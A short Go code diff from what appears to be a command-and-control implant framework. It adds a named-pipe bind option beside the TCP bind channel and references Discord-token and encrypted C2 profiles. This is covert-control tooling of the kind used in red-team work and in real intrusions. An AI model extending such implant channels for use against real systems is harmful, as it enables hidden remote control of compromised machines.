@@ -27,7 +27,7 @@ type c2Setup struct {
 // initC2Profile creates and configures the appropriate C2 profile based on
 // build-time configuration variables.
 func initC2Profile(cfg parsedConfig) (*c2Setup, error) {
-	if tcpBindAddress != "" {
+	if tcpBindAddress != "" || namedPipeBindName != "" {
 		return initTCPC2(cfg)
 	}
 	if discordBotToken != "" {
@@ -40,8 +40,12 @@ func initC2Profile(cfg parsedConfig) (*c2Setup, error) {
 }
 
 func initTCPC2(cfg parsedConfig) (*c2Setup, error) {
-	log.Printf("bind %s", tcpBindAddress)
-	tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, cfg.debug)
+	if namedPipeBindName != "" {
+		log.Printf("pipe %s", namedPipeBindName)
+	} else {
+		log.Printf("bind %s", tcpBindAddress)
+	}
+	tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, cfg.debug, namedPipeBindName)
 	if err := tcpProfile.SealConfig(); err != nil {
 		log.Printf("tcp vault seal failed: %v", err)
 	}
